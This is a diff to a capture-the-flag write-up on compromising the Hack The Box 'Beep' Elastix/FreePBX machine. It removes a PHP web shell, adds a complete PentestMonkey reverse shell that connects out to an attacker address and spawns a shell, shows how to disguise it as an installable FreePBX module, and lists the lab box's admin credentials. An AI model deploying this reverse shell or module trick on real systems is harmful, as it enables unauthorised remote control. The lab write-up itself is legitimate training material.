@@ -91,10 +91,6 @@ Next off I tried simply searching for "Elastix Vulnerability" and stumbled acros
 I copied contents of the file into file on my local machine and searched for usernames and password. It didn't take long to find a username and a few password options from the file. Trying out these on the login page granted access to "admin" account.  
 ![Username](img/10_beep.png) ![Password](img/09_beep.png)
 
-admin:jEhdIekWmdjE
-
-elastix:passw0rd ?
-
 Before exploring the dashboard furhter, I wanted to see if these credentials were re-used and tried to ssh into the machine.
 ```sh
 touhottaja@Laptop:~$ ssh admin@10.129.229.183
@@ -134,25 +130,124 @@ Next I visited `/admin` endpoint which prompted for credentials as well. The sam
 The first menu I checked on this admin page was the Module Admin menu, in which I found a Upload module button. If my theory was correct, I could upload my own php code which would spawn a reverse shell.  
 ![Module Admin menu](img/20_beep.png)
 
-I created my shell file
+I got the reverse shell from PentestMonkey:
 ```php
-<html>
-<body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
 <?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.14.57';
+$port = 4455;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
 ?>
-</pre>
-</body>
-<script>document.getElementById("cmd").focus();</script>
-</html>
 ```
 and tried uploading it to as a module. This didn't work, because FreePBX expects the file to be in tar+gzip (.tgz or .tar.gz) format. No biggie, I can do that easily with:
 ```sh
@@ -162,4 +257,36 @@ That failed due to format error. The filename has to be in format modulename-ver
 ```sh
 $ mv shell.tar.gz shell-0.1.tar.gz
 ```
-The next error was file extraction error. The tar did not extract correctly. At this point it made more sense to read how the FreePBX module was supposed to be built instead of trying to "brute force it".
+The next error was file extraction error. The tar did not extract correctly. At this point it made more sense to read how the FreePBX module was supposed to be built instead of trying to "brute force" it.
+
+I went to github to see how others built their modules, and fixed my module's structure. The correct structure looked like:
+```sh
+$ ls shell/
+install.php  module.xml
+```
+
+`install.php` contained the reverse shell script from above and `module.xml` contained the following:
+```sh
+<module>
+  <rawname>shell</rawname>
+  <name>shell</name>
+  <version>0.1</version>
+  <publisher>John Doe</publisher>
+  <license>MIT</license>
+  <changelog>*1.0* Initial release</changelog>
+  <category>Admin</category>
+  <description>php reverse shell</description>
+  <menuitems>
+    <shell>shell</shell>
+  </menuitems>
+</module>
+```
+
+After these changes, the module was uploaded successfully.  
+![Successful module upload](img/22_beep.png)
+
+I set the module to be installed and pressed "process" on top of the adming page to install the module.
+![Install module](img/23_beep.png)
+
+
+admin:jEhdIekWmdjE
